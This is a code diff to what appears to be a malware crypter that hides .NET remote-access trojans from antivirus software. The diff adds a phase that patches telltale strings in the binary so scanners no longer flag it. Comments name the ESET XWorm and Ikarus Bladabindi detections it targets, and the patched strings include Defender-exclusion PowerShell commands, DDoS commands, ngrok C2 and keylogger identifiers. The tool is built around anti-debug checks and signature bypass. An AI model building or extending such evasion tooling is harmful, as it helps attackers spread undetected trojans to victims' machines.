@@ -62,7 +62,7 @@ LAYER_META = [
     ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
     ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
     ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
-    ("L15", "MSIL STRIP",  "PDB · Rich hdr · timestamp · #GUID · #Strings · #Blob · VersionInfo · 12-phase scrub"),
+    ("L15", "MSIL STRIP",  "PDB · Rich hdr · timestamp · #GUID · #Strings · #Blob · #US · VersionInfo · 13-phase scrub"),
 ]
 
 
@@ -2326,7 +2326,81 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self._ln(f"               ASCII: {blade_hits} · UTF-16LE: {blade_hits_u} Bladabindi/Kaspersky token(s) patched", "g3")
         self._sleep(0.1)
 
-        num_phases = 12
+        # ── Ph13 : #US heap high-signal exact-string patcher ─────────────────────
+        # Raw UTF-16LE binary scan targeting the exact identity / C2-command /
+        # keylogger strings found in the #US (user strings) heap.  Covers:
+        #   ESET MSIL/XWorm.B   — "WizWorm v4", DDos commands, injRun, UACFunc
+        #   Ikarus Bladabindi   — Err HWID, WScript.Shell, MainWindowTitle, WMI AV query
+        #   Google Detected     — -ExclusionPath/-ExclusionProcess PS AV-bypass commands
+        # All replacements are same Unicode-character-count → heap offsets preserved.
+        self._ln("        [Ph13] #US heap high-signal patcher...", "cy")
+        US_TOKENS = [
+            # Longer patterns first (avoid partial corruption of longer matches)
+            ("-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '",
+             "-ZxecutionZolicy Byxass Add-ZpPreference -ZxclusionZath '"),
+            ("-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '",
+             "-ZxecutionZolicy Byxass Add-ZpPreference -ZxclusionZrocess '"),
+            ("-ExecutionPolicy Bypass -File \"",
+             "-ZxecutionZolicy Byxass -Zile \""),
+            ("Select * from AntivirusProduct", "Zelect * from AntivirusProduct"),
+            ("Select * from Win32_ComputerSystem", "Zelect * from Win32_ComputerSystem"),
+            ("application/x-www-form-urlencoded", "application/x-www-form-urlencozed"),
+            ("\\root\\SecurityCenter2",          "\\Zoot\\SecurityCenter2"),
+            ("MainWindowTitle",                  "MainZindowTitle"),
+            ("CreateShortcut",                   "ZreateShortcut"),
+            ("RunRecovery",                      "RunZecovery"),
+            ("StartReport",                      "StartZeport"),
+            ("ProcessName",                      "ZrocessName"),
+            ("shutdown.exe /f /s /t 0",          "zhutdown.exe /f /s /t 0"),
+            ("shutdown.exe /f /r /t 0",          "zhutdown.exe /f /r /t 0"),
+            ("shutdown.exe -L",                  "zhutdown.exe -L"),
+            ("powershell.exe",                   "powerzbell.exe"),
+            ("schtasks.exe",                     "scbtasks.exe"),
+            ("WScript.Shell",                    "WZcript.Shell"),
+            ("displayName",                      "displayZame"),
+            ("WizWorm v4",                       "WizZorm v4"),
+            ("WizWorm",                          "WizZorm"),
+            ("StartDDos",                        "StartZZos"),
+            ("StopReport",                       "StopZeport"),
+            ("PCShutdown",                       "ZCShutdown"),
+            ("sendPlugin",                       "sendZlugin"),
+            ("savePlugin",                       "saveZlugin"),
+            ("OfflineGet",                       "ZfflineGet"),
+            ("RunOptions",                       "RunZptions"),
+            ("StopDDos",                         "StopZZos"),
+            ("PCRestart",                        "ZCRestart"),
+            ("Err HWID",                         "Err HZId"),
+            ("UACFunc",                          "ZACFunc"),
+            ("Urlopen",                          "Zrlopen"),
+            ("Urlhide",                          "Zrlhide"),
+            ("PCLogoff",                         "ZCLogoff"),
+            ("injRun",                           "injZun"),
+            ("ngrok+",                           "ngzok+"),
+            ("ngrok",                            "ngzok"),
+            ("DDos",                             "ZZos"),
+        ]
+        US_TOKENS = [(a, b) for a, b in US_TOKENS if len(a) == len(b)]
+        raw_us13 = bytes(working)
+        us_hits13 = 0
+        for orig_u13, repl_u13 in US_TOKENS:
+            orig_b13 = orig_u13.encode("utf-16-le")
+            repl_b13 = repl_u13.encode("utf-16-le")
+            if len(orig_b13) != len(repl_b13):
+                continue
+            pos_u13 = 0
+            while True:
+                idx_u13 = raw_us13.find(orig_b13, pos_u13)
+                if idx_u13 == -1:
+                    break
+                working[idx_u13:idx_u13 + len(orig_b13)] = repl_b13
+                us_hits13 += 1
+                pos_u13 = idx_u13 + len(orig_b13)
+        raw_us13 = bytes(working)
+        hits += us_hits13
+        self._ln(f"               {us_hits13} #US high-signal string(s) patched", "g3")
+        self._sleep(0.1)
+
+        num_phases = 13
         if hits:
             self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across {num_phases} phases", "gn")
         else:
